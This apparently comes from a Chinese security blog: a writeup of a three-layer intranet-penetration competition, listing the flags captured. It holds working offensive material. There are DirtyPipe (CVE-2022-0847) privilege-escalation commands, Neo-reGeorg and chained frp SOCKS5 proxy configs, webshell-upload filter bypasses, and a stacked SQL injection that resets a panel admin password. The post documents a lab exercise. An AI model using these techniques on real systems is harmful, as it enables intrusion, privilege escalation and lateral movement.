@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="en"> <head><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>某内网渗透内部赛 Writeup</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><meta name="generator" content="Astro v5.9.0"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/msa-intranet-penetration/"><title>某内网渗透内部赛 Writeup
+
+
+
+<!-- Open Graph / Facebook -->
+
+
+
+
+
+<!-- Twitter -->
+
+
+
+</title><meta name="title" content="某内网渗透内部赛 Writeup"><meta name="description" content><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/msa-intranet-penetration/"><meta property="og:title" content="某内网渗透内部赛 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/msa-intranet-penetration/"><meta property="twitter:title" content="某内网渗透内部赛 Writeup"><meta property="twitter:description" content><link rel="stylesheet" href="/_astro/_slug_.D2NkKxuK.css">
+<link rel="stylesheet" href="/_astro/waline.nkDt9Ep-.css">
+<link rel="stylesheet" href="/_astro/_slug_.D48ksWp2.css">
+<link rel="stylesheet" href="/_astro/_slug_.DEy1TFvp.css">
+<style>#waline[data-astro-cid-cjuph4ok]{margin:2rem 0}
+</style></head> <!-- Global Metadata --> <!-- Font preloads --> <!-- Canonical URL --> <!-- Primary Meta Tags --> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const a=document.getElementById("article");if(a){const n=a.getElementsByTagName("img");Array.from(n).forEach(e=>{const t=document.createElement("a");t.setAttribute("data-fancybox","gallery"),t.href=e.src,e.parentNode?.insertBefore(t,e),t.appendChild(e)})}});</script></head> <body class="bg-white"> <header class="relative m-0 px-4 py-4 mb-8" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <!-- 桌面端导航 --> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 移动端菜单按钮 --> <button id="menu-btn" class="md:hidden flex flex-col space-y-1 p-2 text-black" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <!-- 移动端下拉菜单 --> <div id="menu" class="md:hidden absolute top-full left-0 w-full bg-white dark:bg-gray-900 shadow-lg border-t dark:border-gray-700 hidden" data-astro-cid-3ef6ksr2> <div class="flex flex-col py-2" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),t=document.getElementById("menu");e?.addEventListener("click",()=>{t?.classList.toggle("hidden"),e.classList.toggle("open")});document.addEventListener("click",n=>{!e?.contains(n.target)&&!t?.contains(n.target)&&(t?.classList.add("hidden"),e?.classList.remove("open"))});</script>  <main class="min-h-screen"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 mb-6 tracking-tight leading-tight"> 某内网渗透内部赛 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2023-12-12T16:30:47.000Z" class="text-[#86868b] tracking-wide"> <time datetime="2023-12-12T16:30:47.000Z"> Dec 13, 2023 </time> </time> <span class="text-[#d2d2d7] flex items-center">|</span>
+							
+							<div class="flex items-center"> <span class="flex items-center"> <a href="/categories/技术/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> 技术 </a>  </span> </div>  <span class="text-[#d2d2d7] flex items-center">|</span> <div class="flex items-center"> <span class="flex items-center"> <a href="/tags/CTF/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> CTF </a> <span class="text-[#d2d2d7] mx-2">·</span> </span><span class="flex items-center"> <a href="/tags/网络安全/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> 网络安全 </a> <span class="text-[#d2d2d7] mx-2">·</span> </span><span class="flex items-center"> <a href="/tags/内网渗透/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> 内网渗透 </a> <span class="text-[#d2d2d7] mx-2">·</span> </span><span class="flex items-center"> <a href="/tags/Writeup/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> Writeup </a>  </span> </div>  </div> </header>  <nav class="toc" data-astro-cid-woz2nwfv> <h2 class="toc-title" data-astro-cid-woz2nwfv>目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#写在前面" class="toc-link" data-astro-cid-woz2nwfv> 1. 写在前面 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#第一层" class="toc-link" data-astro-cid-woz2nwfv> 2. 第一层 </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#信息泄露" class="toc-link" data-astro-cid-woz2nwfv> 2.1. 信息泄露 </a> </li><li data-astro-cid-woz2nwfv> <a href="#后台" class="toc-link" data-astro-cid-woz2nwfv> 2.2. 后台 </a> </li><li data-astro-cid-woz2nwfv> <a href="#webshell" class="toc-link" data-astro-cid-woz2nwfv> 2.3. webshell </a> </li><li data-astro-cid-woz2nwfv> <a href="#提权" class="toc-link" data-astro-cid-woz2nwfv> 2.4. 提权 </a> </li><li data-astro-cid-woz2nwfv> <a href="#数据安全" class="toc-link" data-astro-cid-woz2nwfv> 2.5. 数据安全 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#第二层" class="toc-link" data-astro-cid-woz2nwfv> 3. 第二层 </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#数据库" class="toc-link" data-astro-cid-woz2nwfv> 3.1. 数据库 </a> </li><li data-astro-cid-woz2nwfv> <a href="#后台-1" class="toc-link" data-astro-cid-woz2nwfv> 3.2. 后台 </a> </li><li data-astro-cid-woz2nwfv> <a href="#webshell-1" class="toc-link" data-astro-cid-woz2nwfv> 3.3. webshell </a> </li><li data-astro-cid-woz2nwfv> <a href="#提权-1" class="toc-link" data-astro-cid-woz2nwfv> 3.4. 提权 </a> </li><li data-astro-cid-woz2nwfv> <a href="#数据安全-1" class="toc-link" data-astro-cid-woz2nwfv> 3.5. 数据安全 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#第三层" class="toc-link" data-astro-cid-woz2nwfv> 4. 第三层 </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#信息泄露-1" class="toc-link" data-astro-cid-woz2nwfv> 4.1. 信息泄露 </a> </li><li data-astro-cid-woz2nwfv> <a href="#后台-2" class="toc-link" data-astro-cid-woz2nwfv> 4.2. 后台 </a> </li><li data-astro-cid-woz2nwfv> <a href="#webshell-2" class="toc-link" data-astro-cid-woz2nwfv> 4.3. webshell </a> </li><li data-astro-cid-woz2nwfv> <a href="#提权-2" class="toc-link" data-astro-cid-woz2nwfv> 4.4. 提权 </a> </li><li data-astro-cid-woz2nwfv> <a href="#数据安全-2" class="toc-link" data-astro-cid-woz2nwfv> 4.5. 数据安全 </a> </li> </ol> </li> </ol> </nav>  <script type="module">document.querySelectorAll(".toc-link").forEach(o=>{o.addEventListener("click",t=>{t.preventDefault();const e=o.getAttribute("href")?.slice(1);if(e){const i=document.getElementById(e);if(i){const c=i.getBoundingClientRect().top+window.pageYOffset-100;window.scrollTo({top:c,behavior:"smooth"})}}})});const s=new IntersectionObserver(o=>{const t=o.filter(e=>e.isIntersecting);if(t.length>0){const i=t.reduce((n,c)=>n.boundingClientRect.top<c.boundingClientRect.top?n:c).target.id;document.querySelectorAll(".toc-link.active").forEach(n=>n.classList.remove("active"));const r=document.querySelector(`.toc-link[href="#${i}"]`);r&&r.classList.add("active")}},{rootMargin:"-10% 0px -70% 0px",threshold:[0,.5,1]});document.querySelectorAll(".toc-link").forEach(o=>{const t=o.getAttribute("href")?.slice(1);if(t){const e=document.getElementById(t);e&&s.observe(e)}});</script>  <div class="fancybox-container">  <div id="article" class="prose prose-lg max-w-none">   <h2 id="写在前面">写在前面</h2>
+<p>第一次打内网渗透类的竞赛，以前渗透都是点到为止，整体感觉还是挺有意思的。<!--more--></p>
+<h2 id="第一层">第一层</h2>
+<h3 id="信息泄露">信息泄露</h3>
+<blockquote>
+<p>Tips：先尝试进行最简单的信息收集吧~
+在 <code>robots.txt</code> 中发现账号密码和 flag</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>User-agent:*</span></span>
+<span class="line"><span>Disallow:/admin/</span></span>
+<span class="line"><span>Disallow:/user/</span></span>
+<span class="line"><span>Disallow:/admin:admin888</span></span>
+<span class="line"><span>Disallow:flag{9e3f0ff79b5393c99beb9a6ceba19597}</span></span></code></pre>
+<h3 id="后台">后台</h3>
+<blockquote>
+<p>tips：后台有输入限制锁定，看看哪边能找到登录的用户名和密码吧~
+使用前面得到的账号密码直接登录，在 <code>网站设置</code> 里得到 flag</p>
+</blockquote>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205100046910.png" alt="image-20231205100046910"></p>
+<h3 id="webshell">webshell</h3>
+<blockquote>
+<p>尝试上传个webshell看看吧，出题人为降低难度，把过滤都给删了
+没任何过滤直接找个上传点上传即可，在 <code>C:/phpstudy_pro/</code>发现 flag</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{701c559f41d73ecb0d7560f8429470fd}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205100723231.png" alt="image-20231205100723231"></p>
+<h3 id="提权">提权</h3>
+<blockquote>
+<p>tisp：出题人为降低难度，把第一层的提权给删了，白送一个flag
+确实白送，直接在 <code>Administrator</code> 用户的桌面得到 flag 以及下一题的附件</p>
+</blockquote>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205100917207.png" alt="image-20231205100917207"></p>
+<h3 id="数据安全">数据安全</h3>
+<blockquote>
+<p>某企业程序员针对内网环境所涉及的文件交互进行了安全防护。某红客渗透测试过程中，针对流量进行分析，发现其安全防护存在漏洞，可以通过某些手段获取其中的文件信息。请分析靶机桌面提供的wireshark压缩包，分析出文件信息。</p>
+</blockquote>
+<p><code>FTP-DATA</code> 流量，直接导出即可</p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205101122555.png" alt="image-20231205101122555"></p>
+<p><code>zip</code> 文件存在加密，同时 <code>txt</code> 文件给出了掩码 <code>HelloHOLO_xxxxxx</code> 直接爆破即可</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{e1ea931b9e669bc9bed22dc0dd710359}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205101322511.png" alt="image-20231205101322511"></p>
+<h2 id="第二层">第二层</h2>
+<h3 id="数据库">数据库</h3>
+<blockquote>
+<p>tips：赶紧搭建代理进入第二层吧，为降低难度，出题人把过滤给删除了~
+通过 <code>arp -a</code> 发现双网卡</p>
+</blockquote>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205101647744.png" alt="image-20231205101647744"></p>
+<p>直接传个 <code>fscan</code> 扫一扫 <code>10.10.10.10/24</code> 看看有没有什么资产</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[*] WebTitle: http://10.10.10.20        code:200 len:3083   title:人力HR-员工信息维护系统</span></span>
+<span class="line"><span>[*] NetBios: 10.10.10.10     WORKGROUP\WIN-IFPVISPB8CQ           Windows Server 2012 R2 Datacenter 9600 </span></span>
+<span class="line"><span>[+] mysql:10.10.10.20:3306:root 123456</span></span>
+<span class="line"><span>[*] WebTitle: http://10.10.10.10        code:200 len:18668  title:zzcms专业做招商网的程序源码</span></span></code></pre>
+<p>那没啥好说的， <code>3306</code> 弱口令直接连上得到 flag</p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205103553225.png" alt="image-20231205103553225"></p>
+<h3 id="后台-1">后台</h3>
+<p>根据前面 <code>fscan</code> 的结果来看存在一个网站，由于不出网我们直接使用 <code>Neo-reGeorg</code> 正向代理映射出来</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">python</span><span style="color:#9ECBFF"> neoreg.py</span><span style="color:#9ECBFF"> generate</span><span style="color:#79B8FF"> -k</span><span style="color:#9ECBFF"> password</span></span>
+<span class="line"><span style="color:#B392F0">python</span><span style="color:#9ECBFF"> neoreg.py</span><span style="color:#79B8FF"> -k</span><span style="color:#9ECBFF"> password</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://</span><span style="color:#F97583">&#x3C;</span><span style="color:#9ECBFF">马赛</span><span style="color:#E1E4E8">克</span><span style="color:#F97583">></span><span style="color:#9ECBFF">/tunnel.php</span></span></code></pre>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205103852126.png" alt="image-20231205103852126"></p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231208203117339.png" alt="image-20231208203117339"></p>
+<p>映射后直接使用弱密码 <code>admin:admin888</code> 登录后台，得到 flag</p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205103927557.png" alt="image-20231205103927557"></p>
+<p>这里在提供一种 <code>Frp</code> 代理的方法</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ini"><code><span class="line"><span style="color:#6A737D"># frps.ini</span></span>
+<span class="line"><span style="color:#B392F0">[common]</span></span>
+<span class="line"><span style="color:#F97583">Bind_addr</span><span style="color:#E1E4E8"> = 0.0.0.0</span></span>
+<span class="line"><span style="color:#F97583">bind_port</span><span style="color:#E1E4E8"> = 7000</span></span>
+<span class="line"><span style="color:#6A737D"># frpc.ini</span></span>
+<span class="line"><span style="color:#B392F0">[common]</span></span>
+<span class="line"><span style="color:#F97583">server_addr</span><span style="color:#E1E4E8"> = 服务器地址</span></span>
+<span class="line"><span style="color:#F97583">server_port</span><span style="color:#E1E4E8"> = 7000</span></span>
+<span class="line"><span style="color:#B392F0">[plugin_socks6]</span></span>
+<span class="line"><span style="color:#F97583">type</span><span style="color:#E1E4E8"> = tcp</span></span>
+<span class="line"><span style="color:#F97583">remote_port</span><span style="color:#E1E4E8"> = 7779</span></span>
+<span class="line"><span style="color:#F97583">plugin</span><span style="color:#E1E4E8"> = socks5</span></span>
+<span class="line"><span style="color:#6A737D"># socks5</span></span>
+<span class="line"><span style="color:#E1E4E8">socks5://服务器地址:7779</span></span></code></pre>
+<h3 id="webshell-1">webshell</h3>
+<blockquote>
+<p>tips：这次是有过滤的哦~
+直接个人照片处上传木马即可，过滤直接通过后缀大小写混写绕过</p>
+</blockquote>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205104045797.png" alt="image-20231205104045797"></p>
+<p>在 <code>/var/www/flag</code> 得到 flag</p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205105058697.png" alt="image-20231205105058697"></p>
+<h3 id="提权-1">提权</h3>
+<p>通过内核探针 <code>linux-exploit-suggester.sh</code> 扫描发现为 <a href="https://haxx.in/files/dirtypipez.c">CVE-2022-0847</a></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># 编译</span></span>
+<span class="line"><span style="color:#B392F0">gcc</span><span style="color:#9ECBFF"> dirtypipez.c</span><span style="color:#79B8FF"> -o</span><span style="color:#9ECBFF"> dirtypipez</span></span>
+<span class="line"><span style="color:#6A737D"># 查找 SUID</span></span>
+<span class="line"><span style="color:#B392F0">find</span><span style="color:#9ECBFF"> /</span><span style="color:#79B8FF"> -perm</span><span style="color:#79B8FF"> -u=s</span><span style="color:#79B8FF"> -type</span><span style="color:#9ECBFF"> f</span><span style="color:#F97583"> 2></span><span style="color:#9ECBFF">/dev/null</span></span>
+<span class="line"><span style="color:#6A737D"># 提权</span></span>
+<span class="line"><span style="color:#B392F0">./dirtypipez</span><span style="color:#9ECBFF"> /usr/bin/su</span></span></code></pre>
+<p>但是由于哥斯拉一直得不到交互式shell，所以我们用冰蝎的虚拟终端中转下吧</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{c79a9b423622434c35d0a2099c7dbb07}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231206115658613.png" alt="image-20231206115658613"></p>
+<p>ps: 后期突然发现哥斯拉有一个 <code>superTerminal</code> 功能…</p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231208195253024.png" alt="image-20231208195253024"></p>
+<h3 id="数据安全-1">数据安全</h3>
+<blockquote>
+<p>运维管理员在运维服务器过程中被黑客进行了流量抓取，记录了运维管理员的相关操作，黑客把数据包放在了站点路径下，请选手获取数据包并进行分析，分析出文件信息。</p>
+</blockquote>
+<p>通过前面上传的 <code>Webshell</code> 在 <code>/var/www/html</code> 中得到 <code>EasyUSB.zip</code></p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205105123192.png" alt="image-20231205105123192"></p>
+<p>直接脚本跑一下得到解析后的内容，简单格式化一下代码后运行即可。</p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231205104206278.png" alt="image-20231205104206278"></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> Crypto.Cipher </span><span style="color:#F97583">import</span><span style="color:#79B8FF"> DES</span></span>
+<span class="line"><span style="color:#E1E4E8">key </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'20232023'</span></span>
+<span class="line"><span style="color:#E1E4E8">ad </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'flagdesencrypt!!'</span></span>
+<span class="line"><span style="color:#E1E4E8">cipher </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> DES</span><span style="color:#E1E4E8">.new(key,</span><span style="color:#79B8FF">DES</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">MODE_ECB</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">enc </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> cipher.encrypt(ad)</span></span>
+<span class="line"><span style="color:#E1E4E8">flag </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> enc.hex()</span></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(flag)</span></span>
+<span class="line"><span style="color:#6A737D"># fab588adc8fb6741c949fe74dbf613a1</span></span></code></pre>
+<h2 id="第三层">第三层</h2>
+<h3 id="信息泄露-1">信息泄露</h3>
+<blockquote>
+<p>Tips：进入第三层，白送一个flag
+首先 <code>fscan</code> 扫一下发现 <code>20.20.20.30</code> 存在一个网站</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[*] WebTitle:http://20.20.20.30        code:302 len:0      title:None 跳转url: http://20.20.20.30?m=login</span></span>
+<span class="line"><span>[*] WebTitle:http://20.20.20.20        code:200 len:3083   title:人力HR-员工信息维护系统</span></span>
+<span class="line"><span>[*] WebTitle:http://20.20.20.30:8899   code:200 len:45     title:None</span></span>
+<span class="line"><span>[*] WebTitle:http://20.20.20.30?m=login code:200 len:4012   title:信呼协同办公系统</span></span>
+<span class="line"><span>[+] mysql:20.20.20.20:3306:root 123456</span></span>
+<span class="line"><span>[*] WebTitle:http://20.20.20.30:9080   code:404 len:111    title:404 File not found</span></span>
+<span class="line"><span>[+] mysql:20.20.20.30:3306:root root</span></span></code></pre>
+<p>这里就需要二层代理了，我们既要运行 <code>frps</code> 又要运行 <code>frpc</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ini"><code><span class="line"><span style="color:#6A737D"># 第一层 frps.ini</span></span>
+<span class="line"><span style="color:#B392F0">[common]</span></span>
+<span class="line"><span style="color:#F97583">Bind_addr</span><span style="color:#E1E4E8"> = 0.0.0.0</span></span>
+<span class="line"><span style="color:#F97583">bind_port</span><span style="color:#E1E4E8"> = 7000</span></span>
+<span class="line"><span style="color:#6A737D"># 第一层 frpc.ini</span></span>
+<span class="line"><span style="color:#B392F0">[common]</span></span>
+<span class="line"><span style="color:#F97583">server_addr</span><span style="color:#E1E4E8"> = 服务器地址</span></span>
+<span class="line"><span style="color:#F97583">server_port</span><span style="color:#E1E4E8"> = 7000</span></span>
+<span class="line"><span style="color:#B392F0">[plugin_socks6]</span></span>
+<span class="line"><span style="color:#F97583">type</span><span style="color:#E1E4E8"> = tcp</span></span>
+<span class="line"><span style="color:#F97583">remote_port</span><span style="color:#E1E4E8"> = 7779</span></span>
+<span class="line"><span style="color:#F97583">plugin</span><span style="color:#E1E4E8"> = socks5</span></span>
+<span class="line"><span style="color:#6A737D"># socks5</span></span>
+<span class="line"><span style="color:#E1E4E8">socks5://服务器地址:7779</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 第二层 frpc.ini</span></span>
+<span class="line"><span style="color:#B392F0">[common]</span></span>
+<span class="line"><span style="color:#F97583">server_addr</span><span style="color:#E1E4E8"> = 10.10.10.10</span></span>
+<span class="line"><span style="color:#F97583">server_port</span><span style="color:#E1E4E8"> = 7000</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">[plugin_socks]</span></span>
+<span class="line"><span style="color:#F97583">type</span><span style="color:#E1E4E8"> = tcp</span></span>
+<span class="line"><span style="color:#F97583">remote_port</span><span style="color:#E1E4E8"> = 700</span></span>
+<span class="line"><span style="color:#F97583">plugin</span><span style="color:#E1E4E8"> = socks5</span></span></code></pre>
+<p>然后我们通过 <code>Proxifier</code> 配置个代理链</p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231208211505434.png" alt="image-20231208211505434"></p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231208205301647.png" alt="image-20231208205301647"></p>
+<p>依旧是在 <code>robots.txt</code> 发现 flag</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{a0e9b4a803a1f9fa510aba179fbed179}</span></span></code></pre>
+<h3 id="后台-2">后台</h3>
+<p>通过上面我们得到的 <code>mysql</code> 弱口令连接后得到密码 <code>md5</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>62c8ad0a15d9d1ca38d5dee762a16e01:1234qwer</span></span></code></pre>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231208210925996.png" alt="image-20231208210925996"></p>
+<p>登陆后在 <code>公告</code> 中发现 flag</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{559e179db083aa9e3ca4174fa43804e6}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231208214152924.png" alt="image-20231208214152924"></p>
+<h3 id="webshell-2">webshell</h3>
+<p><code>信呼OA</code> 文件上传漏洞 <a href="https://gitee.com/xieqiangweb/cve/blob/master/cve/Rockoa.md">CVE-2023-1501</a>，直接跟着复现即可</p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231211174914101.png" alt="image-20231211174914101"></p>
+<p>在 <code>/www/admin/localhost_80</code> 发现 flag</p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231208214631021.png" alt="image-20231208214631021"></p>
+<h3 id="提权-2">提权</h3>
+<p>找了半天内核漏洞，发现都不是，突然想起来 <code>fscan</code> 还扫出来一个网站</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[*] WebTitle:http://20.20.20.30:9080   code:404 len:111    title:404 File not found</span></span></code></pre>
+<p>访问后发现为小皮面板，注意请求的时候加个请求头，不然报 404</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>X-Requested-With: XMLHttpRequest</span></span></code></pre>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231208221549232.png" alt="image-20231208221549232"></p>
+<p>一开始先入为主，以为是 <code>XSS</code> + <code>CSRF</code> 通过计划任务实现 <code>RCE</code>，参考我以前的文章 <a href="https://5ime.cn/phpstudy-xss2rce.html">PHPStudy RCE 分析</a> ，可等了半天 <code>XSS</code> 也没被触发， 没办法百度搜索一番还有一个堆叠注入，我们直接修改管理员密码为 <code>123456</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>admin';UPDATE ADMINS set PASSWORD = 'c26be8aaf53b15054896983b43eb6a65' where username = 'admin';--</span></span></code></pre>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231211163828450.png" alt="image-20231211163828450"></p>
+<p>通过计划任务得到 flag</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{c06384d8254dfd903191d205a5fafd4a}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20231211163657767.png" alt="image-20231211163657767"></p>
+<h3 id="数据安全-2">数据安全</h3>
+<blockquote>
+<p>某企业具备较高的网络安全素养，每年都会针对当年发生过的安全事件做相关的安全宣讲。正因为有了这样的安全防范意识，该企业在业务交流中传输的重要文件里都会添加数据水印，便于事件发生后的数据溯源。近日，该企业内部发生一起数据泄露事件，你能从截获到的数据中，提取出水印信息吗？
+提示：该企业参考base隐写；为了防止水印过于明显，对水印进行了混淆、前后截断处理；截断的信息为便于水印恢复，往往存放在文件本身中。
+题目在站点路径:task.zip请提交小写md5(download:xxx:time:xxx)，代码：hashlib.md5(flag.encode()).hexdigest()。</p>
+</blockquote>
+<p>卡这题好久，后来根据提示信息 <code>styles.xml</code> 在其中一个文件中发现多出来了字符串 <code>MjIyOmRvd25sb2FkO</code></p>
+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20240102144246978.png" alt="image-20240102144246978"></p>
+<p>直接和表格内的内容进行拼接后，<code>Base64隐写</code> 解密即可</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>download:zhaoxy:time:1694067120</span></span>
+<span class="line"><span>// md5</span></span>
+<span class="line"><span>flag{de742f8a38757aea249bf42be6da47fd}</span></span></code></pre>
